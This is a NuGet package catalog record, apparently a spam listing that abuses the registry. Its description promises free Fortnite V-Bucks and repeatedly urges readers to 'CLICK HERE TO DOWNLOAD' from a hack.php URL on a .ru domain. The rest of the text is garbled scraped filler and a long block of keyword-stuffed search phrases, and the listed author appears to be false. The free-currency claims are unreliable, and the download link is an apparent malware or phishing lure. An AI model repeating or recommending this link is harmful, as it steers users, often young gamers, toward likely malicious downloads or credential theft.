{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.16.10/_fortnite-free-v-bucks-2021-working-2022-version-tna.3.8.2.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "1597acb3-f76a-4f12-9dd2-0609becd2678",
  "catalog:commitTimeStamp": "2022-01-26T16:16:10.6792452Z",
  "created": "2022-01-26T16:13:50.843Z",
  "description": "# _Fortnite Free V Bucks 2021 Working 2022 Version tna\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\n\nFortnite Winterfest Free V-Bucks: Fortnite Winterfest has already supplied its players with much-coveted rewards like free game skins. F%vbF Free VBucks Generator － Free V Bucks 46 secs ago． Get your Fortnite V. Fortnite Rdeem Codes- January Fortnite Latest Working Redeem Codes July Fortnite redeem codes (Picture: Epic Games). Before redeeming.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\n · Free Codes For Fortnite V Bucks. Acquiring this currency would not provide the players with an extra competitive benefit for the game. Become a member of the builders club; Source: download Check the daily and get unlimited to chance fortnite free v bucks here. Codes (3 days ago) free v bucks promo code; [ ].  · To open Fortnite V-Bucks for free, the best way to do so is to level up by completing Fortnite Missions. You'll be able to unlock new levels in Battle Pass (both the paid and free version). A bunch.  · Fortnite V-Bucks Card these days Fortnite is currently one in every of the foremost contend gameplay and incorporates a vast fan following. people who play Fortnite may need some plan regarding what a V greenbacks card is. These square measure the in-game currency in downloadted Reading Time: 2 mins.\n\nfortnite free v bucks 2021, fortnite free v bucks generator 2021, fortnite free v bucks redeem code 2021, fortnite free v bucks codes ps4 2021, fortnite how to get free v bucks 2021, is fortnite giving free v bucks 2021, fortnite winterfest 2021 free v bucks, fortnite v bucks card codes free 2021, how to get 50 free v bucks fortnite, is fortnite giving away free v bucks, free v bucks fortnite free v bucks 2021, free v bucks generator 2021-fortnite v bucks generator, where can i get free v bucks, fortnite free v bucks codes 2021, how to get a free fortnite code, fortnite cheap codes, free fortnite v bucks 2021, free fortnite codes v bucks 2021, fortnite codes 2021 for vbucks, does fortnite give you free v bucks, fortnite free v bucks generator no human verification 2021, does fortnite v bucks generator work, how to get free v bucks in fortnite generator, how to.get free v bucks on fortnite, how to get free v bucks in fortnite 2020, how to get free v bucks in fortnite without paying, free v-bucks in fortnite 2021, how to get free v bucks in fortnite in 2021, is fortnite giving away vbucks, fortnite v bucks code free 2021, fortnite 20$ v bucks, how to get free v bucks in fortnite 2021 nintendo switch, how to get free v bucks generator without human verification, free fortnite v bucks no human verification or survey 2021, is it possible to get free v bucks without human verification, how to get free v bucks survey, how to get free v bucks no survey or human verification, fortnite free v bucks ps4 2021, how to get free v bucks in fortnite ps4 2021, v bucks for fortnite for free, how do i redeem a fortnite v bucks code, how to get discount on vbucks, real fortnite v bucks codes, how to get free v bucks in fortnite 2021 season 8, how to get free v bucks in fortnite 2021 season 6, how to get free v bucks in fortnite 2021 season 7, fortnite v-bucks free, how do u get free v bucks in fortnite 2021, what is winterfest fortnite, what time does winterfest start fortnite, fortnite free v bucks 13500, fortnite 2020 v bucks generator, fortnite free 1k vbucks, 2021 v bucks codes, fortnite free 500 v bucks, fortnite free v bucks levels, 20$ v bucks fortnite, codes for fortnite v bucks 2021",
  "id": "_Fortnite-Free-V-Bucks-2021-Working-2022-Version-tna",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T16:15:53.52Z",
  "listed": true,
  "packageHash": "4SahNgGGRbDyNMkhjokAAzDpCRpbJQ62HGh6biS86n1X8rQ3l1zgV+cx+xcEzcIXO4k+Qdgma8Q5BNvBwfUFAw==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11535,
  "published": "2022-01-26T16:13:50.843Z",
  "requireLicenseAcceptance": false,
  "title": "_Fortnite-Free-V-Bucks-2021-Working-2022-Version-tna",
  "verbatimVersion": "3.8.2",
  "version": "3.8.2",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.16.10/_fortnite-free-v-bucks-2021-working-2022-version-tna.3.8.2.json#zrjabeafrj.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1409,
      "fullName": "zrjabeafrj.nuspec",
      "length": 4158,
      "name": "zrjabeafrj.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.16.10/_fortnite-free-v-bucks-2021-working-2022-version-tna.3.8.2.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9466,
      "fullName": ".signature.p7s",
      "length": 9466,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}